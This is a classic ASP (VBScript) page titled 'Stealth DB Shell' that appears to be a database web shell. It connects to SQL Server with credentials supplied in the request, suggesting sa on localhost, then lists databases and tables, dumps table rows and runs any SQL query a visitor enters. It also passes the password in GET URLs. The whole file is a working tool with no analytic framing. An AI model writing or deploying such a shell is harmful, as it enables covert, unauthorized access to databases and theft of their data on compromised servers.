<%@ Language=VBScript %>
<%
Dim Conn, RS, ConnStr, ErrMsg
Dim srv, dbn, usr, pwd, act, qry, tbl

srv = Trim(Request("server") & Request.Form("server"))
dbn = Trim(Request("dbname") & Request.Form("dbname"))
usr = Trim(Request("user") & Request.Form("user"))
pwd = Trim(Request("pass") & Request.Form("pass"))
act = Request("act")
qry = Request("query")
tbl = Request("tbl")

ErrMsg = ""

If srv <> "" Then
    ConnStr = "Provider=SQLNCLI11;Server=" & srv & ";"
    If dbn <> "" Then ConnStr = ConnStr & "Database=" & dbn & ";"
    ConnStr = ConnStr & "Uid=" & usr & ";Pwd=" & pwd & ";"

    Set Conn = Server.CreateObject("ADODB.Connection")
    On Error Resume Next
    Conn.Open ConnStr
    If Err.Number <> 0 Then
        ErrMsg = "Connection Failed: " & Err.Description & " (Code: " & Err.Number & ")"
        Set Conn = Nothing
    End If
    On Error Goto 0
End If
%>

<html>
<head><title>Stealth DB Shell - Fixed Permissions</title></head>
<body style="font-family:consolas; background:#000; color:#0f0; padding:20px;">

<h2>DB Shell (Connection Form)</h2>

<form method="post">
    Server: <input name="server" value="<%=Server.HTMLEncode(srv)%>" size="40"><br><br>
    DB: <input name="dbname" value="<%=Server.HTMLEncode(dbn)%>" size="40"><br><br>
    User: <input name="user" value="<%=Server.HTMLEncode(usr)%>" size="40"><br><br>
    Pass: <input type="password" name="pass" value="<%=Server.HTMLEncode(pwd)%>" size="40"><br><br>
    <input type="submit" value="Connect">
</form>

<% If ErrMsg <> "" Then %>
    <div style="color:red; background:#300; padding:15px; margin:15px 0; border:2px solid red;">
        <%=ErrMsg%>
    </div>
<% ElseIf Conn Is Nothing Then %>
    <p style="color:yellow;">Connect first (server: localhost / 127.0.0.1, db: master, user: sa).</p>
<% Else %>
    <div style="color:lime; background:#030; padding:15px; border:2px solid lime;">
        Connected! Server: <%=srv%> | Current DB: <%=dbn%>
    </div>

    <h3>Databases (sirf jinme access hai)</h3>
    <%
    Set RS = Conn.Execute("SELECT name FROM master..sysdatabases WHERE name NOT IN ('master','model','msdb','tempdb') ORDER BY name")
    Do While Not RS.EOF
        Dim dbName : dbName = RS("name")
        ' Test permission by trying to switch
        On Error Resume Next
        Conn.Execute "USE [" & dbName & "]"
        Dim useErr : useErr = Err.Number
        On Error Goto 0
        If useErr = 0 Then
            Response.Write "<a href='?act=tables&server=" & Server.URLEncode(srv) & "&user=" & Server.URLEncode(usr) & "&pass=" & Server.URLEncode(pwd) & "&dbname=" & Server.URLEncode(dbName) & "'>" & dbName & "</a> (access OK)<br>"
        Else
            Response.Write dbName & " <span style='color:#f80;'>(no access - permission denied)</span><br>"
        End If
        RS.MoveNext
    Loop
    RS.Close
    %>

    <h3>Custom Query (tables dekhne ke liye)</h3>
    <form method="get">
        <input type="hidden" name="server" value="<%=Server.URLEncode(srv)%>">
        <input type="hidden" name="user" value="<%=Server.URLEncode(usr)%>">
        <input type="hidden" name="pass" value="<%=Server.URLEncode(pwd)%>">
        <input type="hidden" name="dbname" value="<%=Server.URLEncode(dbn)%>">
        Query: <input name="query" size="80" value="SELECT name FROM sys.tables"><br>
        <input type="submit" value="Run">
    </form>

    <% If qry <> "" Then %>
        <h4>Query Result:</h4>
        <pre style="background:#111; padding:15px; border:1px solid #0f0;">
        <%
        On Error Resume Next
        Set RS = Conn.Execute(qry)
        If Err.Number <> 0 Then
            Response.Write "Query failed: " & Err.Description
        ElseIf Not RS.EOF Then
            Do While Not RS.EOF
                For Each fld In RS.Fields
                    Response.Write fld.Name & ": " & Server.HTMLEncode(fld.Value & "") & vbCrLf
                Next
                Response.Write "-------------------" & vbCrLf
                RS.MoveNext
            Loop
        Else
            Response.Write "Query OK (no rows)."
        End If
        On Error Goto 0
        RS.Close
        %>
        </pre>
    <% End If %>

    <% If act = "tables" And dbn <> "" Then %>
        <h3>Tables in <%=dbn%></h3>
        <%
        On Error Resume Next
        Conn.Execute "USE [" & dbn & "]"
        If Err.Number <> 0 Then
            Response.Write "<div style='color:red; font-weight:bold;'>USE [" & dbn & "] failed: " & Err.Description & "</div>"
        Else
            Set RS = Conn.Execute("SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE' ORDER BY TABLE_NAME")
            If Err.Number <> 0 Then
                Response.Write "<div style='color:red;'>Tables list failed: " & Err.Description & "</div>"
            ElseIf RS.EOF Then
                Response.Write "No tables found or no access."
            Else
                Do While Not RS.EOF
                    Response.Write "<a href='?act=browse&server=" & Server.URLEncode(srv) & "&user=" & Server.URLEncode(usr) & "&pass=" & Server.URLEncode(pwd) & "&dbname=" & Server.URLEncode(dbn) & "&tbl=" & Server.URLEncode(RS("TABLE_NAME")) & "'>" & RS("TABLE_NAME") & "</a><br>"
                    RS.MoveNext
                Loop
            End If
            RS.Close
        End If
        On Error Goto 0
        %>
    <% End If %>

    <% If act = "browse" And tbl <> "" Then %>
        <h3>Data from <%=tbl%></h3>
        <%
        On Error Resume Next
        Conn.Execute "USE [" & dbn & "]"
        Set RS = Conn.Execute("SELECT TOP 50 * FROM [" & tbl & "]")
        If Err.Number <> 0 Then
            Response.Write "<div style='color:red;'>Browse failed: " & Err.Description & "</div>"
        ElseIf Not RS.EOF Then
            Response.Write "<table border='1' style='border-color:#0f0;'>"
            Response.Write "<tr>"
            For Each fld In RS.Fields
                Response.Write "<th>" & fld.Name & "</th>"
            Next
            Response.Write "</tr>"
            Do While Not RS.EOF
                Response.Write "<tr>"
                For Each fld In RS.Fields
                    Response.Write "<td>" & Server.HTMLEncode(fld.Value & "") & "</td>"
                Next
                Response.Write "</tr>"
                RS.MoveNext
            Loop
            Response.Write "</table>"
        Else
            Response.Write "Table empty ya access nahi."
        End If
        RS.Close
        On Error Goto 0
        %>
    <% End If %>
<% End If %>

</body>
</html>

<%
If IsObject(RS) Then RS.Close
If IsObject(Conn) Then Conn.Close
%>
